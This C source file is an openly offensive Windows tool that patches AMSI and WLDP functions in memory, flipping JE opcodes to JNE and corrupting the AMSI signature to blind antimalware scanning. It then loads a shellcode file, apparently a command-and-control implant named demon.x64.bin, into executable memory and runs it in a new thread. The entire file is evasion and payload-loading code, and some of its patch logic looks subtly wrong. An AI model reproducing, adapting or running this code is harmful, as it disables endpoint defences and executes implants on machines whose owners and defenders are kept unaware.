#include <windows.h>
#include <stdio.h>
#include <tchar.h>
// This script aims to patch the AMSI (Antimalware Scan Interface) to bypass its scanning functionality.

// Define x64 opcodes for relevant instructions
#define x64_RET_OPCODE      0xC3
#define x64_INT3_OPCODE     0xCC
#define x64_JE_OPCODE       0x74
#define x64_JNE_OPCODE      0x75
#define x64_MOV_OPCODE      0xB8
#define AMSI_SIGNATURE      0x49534D41  // AMSI signature to be replaced with "C" (0x43)

// Function to verify if the specified address contains the expected JE opcode
BOOL VerifyAddress(_In_ PBYTE pAddress) {
    PBYTE pMovIns = NULL;
    BYTE bOffset = 0x00;

    // Check if the byte at the specified address is not equal to the Jump If Equal (JE) opcode
    if (*(PBYTE)pAddress != x64_JE_OPCODE) {
        printf("[!] Opcode at address 0x%p is not equal to the Jump If Equal (JE) opcode (0x%X).\n", (void*)pAddress, x64_JE_OPCODE);
        return FALSE;
    }

    // Calculate the offset of the jmp address + 1 (skip JE instruction)
    bOffset = *(PBYTE)(pAddress + sizeof(BYTE));
    printf("[+] bOffset: %hhu \n", bOffset);

    // Add the offset to the address next to the JE offset instruction
    pMovIns = (PBYTE)(pAddress + (sizeof(BYTE) * 2) + bOffset);
    printf("[+] pMovIns: 0x%p \n", (void*) pMovIns);

    // Return TRUE if the byte at the calculated address is equal to the Move (MOV) opcode, otherwise, return FALSE
    return (*(PBYTE)pMovIns == x64_MOV_OPCODE) ? TRUE : FALSE;
}

// Function to patch a specified JE instruction with a JNE instruction
BOOL PatchAOpenSessionJE(_In_ PBYTE pSession) {
    PBYTE px74Opcode = NULL;
    DWORD i = 0;
    DWORD dwOldProtect = 0x00;

    // Check if pSession holds a valid value
    if (!pSession)
        return FALSE;

    // Find the last 'ret' instruction
    while (1) {
        if (pSession[i] == x64_RET_OPCODE && pSession[i + 1] == x64_INT3_OPCODE && pSession[i + 2] == x64_INT3_OPCODE)
            break;
        i++;
    }

    // Find the first 'je' instruction upwards
    while (i) {
        if (pSession[i] == x64_JE_OPCODE) {
            px74Opcode = &pSession[1];
            break;
        }
        i--;
    }

    printf("[+] Original 'je' Instruction Found At: 0x%p \n", px74Opcode);

    // Check if px74opcode holds a value
    if (!px74Opcode)
        return FALSE;

    printf("[+] Replacing JE With JNE Instruction\n");

    // Change px74opcode to RWX to patch it
    if (!VirtualProtect(px74Opcode, 0x01, PAGE_EXECUTE_READWRITE, &dwOldProtect)) {
        printf("[!] VirtualProtect Failed With Error code: %lu \n", GetLastError());
        return FALSE;
    }

    // Apply patch by changing the opcode
    *(BYTE*)px74Opcode = x64_JNE_OPCODE;

    // Change back to the original protection
    if (!VirtualProtect(px74Opcode, 0x01, dwOldProtect, &dwOldProtect)) {
        printf("[!] VirtualProtect Failed With Error code: %lu \n", GetLastError());
        return FALSE;
    }

    printf("\t[+] New 'je' Instruction Found At: 0x%p \n", px74Opcode);
    return TRUE;
}

// Function to patch the AmsiScanBuffer JE instruction, effectively bypassing AMSI
BOOL PatchAScanBuffer(_In_ PBYTE pSession) {
    PBYTE px74Opcode = NULL;
    DWORD i = 0;
    DWORD dwOldProtect = 0x00;

    if (!pSession)
        return FALSE;

    // Find the last 'ret' instruction
    while (1) {
        if (pSession[i] == x64_RET_OPCODE && pSession[i + 1] == x64_INT3_OPCODE && pSession[i + 2] == x64_INT3_OPCODE)
            break;
        i++;
    }

    // Find the first 'je' instruction upwards
    while (i) {
        if (pSession[i] == x64_JE_OPCODE) {
            px74Opcode = &pSession[i];
            break;
        }
        i--;
    }

    printf("[+] Original 'je' Instruction Found At: 0x%p \n", px74Opcode);

    // Check if px74opcode holds a value
    if (!px74Opcode)
        return FALSE;

    printf("[+] Replacing JE With JNE Instruction\n");

    // Change memory permissions to RWX
    if (!VirtualProtect(px74Opcode, 0x01, PAGE_EXECUTE_READWRITE, &dwOldProtect))
        return FALSE;

    // Apply the patch by changing the opcode
    *(BYTE*)px74Opcode = x64_JNE_OPCODE;

    // Change memory permissions back to the original protection
    if (!VirtualProtect(px74Opcode, 0x01, dwOldProtect, &dwOldProtect))
        return FALSE;

    printf("\t[+] New 'je' Instruction Found At: 0x%p \n", px74Opcode);

    return TRUE;
}

// Function to patch the AMSI signature, effectively bypassing AMSI
BOOL PatchASignature(_In_ PBYTE pBaseAddressOpenSession) {
    PBYTE pAmsiSignature = NULL;
    DWORD i = 0;
    DWORD dwOldProtect = 0x00;;

    if (!pBaseAddressOpenSession)
        return FALSE;

    // Search for the last 'ret' instruction
    while (1) {
        if (pBaseAddressOpenSession[i] == x64_RET_OPCODE && pBaseAddressOpenSession[i + 1] == x64_INT3_OPCODE && pBaseAddressOpenSession[i + 2] == x64_INT3_OPCODE)
            break;
        i++;
    }

    // Search for the AMSI string
    for (DWORD x = 0; x < i; x++) {
        if (*(ULONG*)(pBaseAddressOpenSession + x) == AMSI_SIGNATURE) {
            pAmsiSignature = &pBaseAddressOpenSession[x];
            break;
        }
    }

    // Check if AMSI string is not empty
    if (!pAmsiSignature)
        return FALSE;

    // Change memory permissions to RWX
    if (!VirtualProtect(pAmsiSignature, 0x01, PAGE_EXECUTE_READWRITE, &dwOldProtect)) {
        printf("[!] VirtualProtect Failed With Error Code: %lu \n", GetLastError());
        return FALSE;
    }

    // Replace the first byte of the AMSI signature with 0x43 (C)
    *(BYTE*)pAmsiSignature = 0x43;

    // Change memory permissions back to the original protection
    if (!VirtualProtect(pAmsiSignature, 0x01, dwOldProtect, &dwOldProtect)) {
        printf("[!] VirtualProtect Failed With Error Code: %lu \n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

// Function to patch the WldpQueryDynamicCodeTrust JE instruction
BOOL PatchWldpQueryDynamicCodeTrustJe(_In_ PBYTE pWldp) {
    PBYTE px74Opcode = NULL;
    DWORD i = 0x00;
    DWORD dwOldProtect = 0x00;

    if (!pWldp)
        return FALSE;

    printf("[+] Original 'je' Instruction Found At: 0x%p \n", px74Opcode);

    // Get the last 'ret' instruction
    while (1) {
        if (pWldp[i] == x64_RET_OPCODE && pWldp[i + 1] == x64_INT3_OPCODE && pWldp[i + 2] == x64_INT3_OPCODE)
            break;
        i++;
    }

    // Find the first 'je' instruction
    for (DWORD x = 0; x < i; x++) {
        if (pWldp[x] == x64_JE_OPCODE) {
            px74Opcode = &pWldp[x];
            break;
        }
    }

    if (!px74Opcode)
        return FALSE;

    printf("[+] Replacing JE With JNE Instruction\n");

    // Change memory permissions to RWX
    if (!VirtualProtect(pWldp, 0x01, PAGE_EXECUTE_READWRITE, &dwOldProtect)) {
        printf("[!] VirtualProtect Failed With Error Code: %lu \n", GetLastError());
        return FALSE;
    }

    // Apply the patch by changing the opcode
    *(BYTE*)pWldp = x64_JNE_OPCODE;

    // Change memory permissions back to the original protection
    if (!VirtualProtect(pWldp, 0x01, dwOldProtect, &dwOldProtect)) {
        printf("[!] VirtualProtect Failed With Error Code: %lu \n", GetLastError());
        return FALSE;
    }

    printf("\t[+] New 'je' Instruction Found At: 0x%p \n", px74Opcode);

    return TRUE;
}

// Function to inject and execute shellcode from a file locally
BOOL InjectShellcodeFileLocally(_In_ LPCWSTR wsFilename) {
    HANDLE hFile = INVALID_HANDLE_VALUE, hThread = NULL;
    DWORD dwBufferSize = 0, dwNumberOfBytesRead = 0, dwOldProtection = 0;
    PBYTE pBufferData = NULL;
    DWORD dwThreadId = 0x00;
    BOOL bResults = FALSE;

    // Open the shellcode file
    if ((hFile = CreateFileW(wsFilename, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
        printf("[!] CreateFileW Failed With Error : %lu \n", GetLastError());
        goto _EndOfFunc;
    }

    // Get the size of the shellcode file
    if ((dwBufferSize = GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE) {
        printf("[!] GetFileSize Failed With Error : %lu \n", GetLastError());
        goto _EndOfFunc;
    }

    // Allocate memory to store the shellcode
    if ((pBufferData = VirtualAlloc(NULL, dwBufferSize, MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE)) == NULL) {
        printf("[!] VirtualAlloc Failed With Error : %lu \n", GetLastError());
        goto _EndOfFunc;
    }

    // Read the shellcode from the file
    if (!ReadFile(hFile, pBufferData, dwBufferSize, &dwNumberOfBytesRead, NULL) || dwNumberOfBytesRead != dwBufferSize) {
        printf("[!] ReadFile Failed With Error : %lu \n", GetLastError());
        printf("[!] Bytes Read: %d of %d \n", dwNumberOfBytesRead, dwBufferSize);
        goto _EndOfFunc;
    }

    // Change memory permissions to allow execution
    if (!VirtualProtect(pBufferData, dwBufferSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("[!] VirtualProtect Failed With Error : %lu \n", GetLastError());
        goto _EndOfFunc;
    }

    // Execute the shellcode in a new thread
    printf("\t> Running Payload Via Thread ");
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pBufferData, NULL, 0, &dwThreadId);
    printf("[ %d ] ... \n", dwThreadId);
    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }
    bResults = TRUE;

    _EndOfFunc:
    // Cleanup resources
    if (hFile != INVALID_HANDLE_VALUE)
        CloseHandle(hFile);

    return bResults;
}

// Main function
int main() {
    // Load the required libraries into memory
    if (!LoadLibrary(TEXT("AMSI"))) {
        printf("[!] LoadLibrary [1] Failed With Error: %lu \n", GetLastError());
        return 1;
    }

    if (!LoadLibrary(TEXT("WLDP"))) {
        printf("[!] LoadLibrary [2] Failed With Error: %lu \n", GetLastError());
        return 1;
    }

    // Get the base addresses of the modules
    PVOID pAmsiOpenSession = GetProcAddress(GetModuleHandle(TEXT("AMSI")), "AmsiOpenSession");
    PVOID pAmsiScanBuffer = GetProcAddress(GetModuleHandle(TEXT("AMSI")), "AmsiScanBuffer");
    PVOID pWldpQueryDynamicCodeTrust = GetProcAddress(GetModuleHandle(TEXT("WLDP")), "WldpQueryDynamicCodeTrust");

    if (!pAmsiOpenSession || !pAmsiScanBuffer || !pWldpQueryDynamicCodeTrust)
        return 1;

    printf("[+] Base Address AmsiOpenSession: 0x%p \n", pAmsiOpenSession);
    printf("[+] Base Address AmsiScanBuffer: 0x%p \n", pAmsiScanBuffer);
    printf("[+] Base Address WldpQueryDynamicCodeTrust: 0x%p \n", pWldpQueryDynamicCodeTrust);

    printf("[i] Running 'PatchAmsiScanBufferJe' ... \n");
    if (!PatchAScanBuffer(pAmsiScanBuffer))
        printf("[!] PatchAScanBuffer Has Failed \n");
    else
        printf("[+] PatchAScanBuffer Completed \n");

    printf("\n");

    printf("[i] Running 'PatchAmsiSignature' ...  \n");
    if (!PatchASignature(pAmsiScanBuffer))
        printf("[!] PatchASignature Has Failed \n");
    else
        printf("[+] PatchASignature Completed \n");

    printf("\n");

    if (!InjectShellcodeFileLocally(L"C:\\Users\\0xBinary\\Downloads\\Share\\demon.x64.bin"))
        return 1;

    printf("[+] Press <Enter To Exit\n");
    getchar();

    return 0;
}
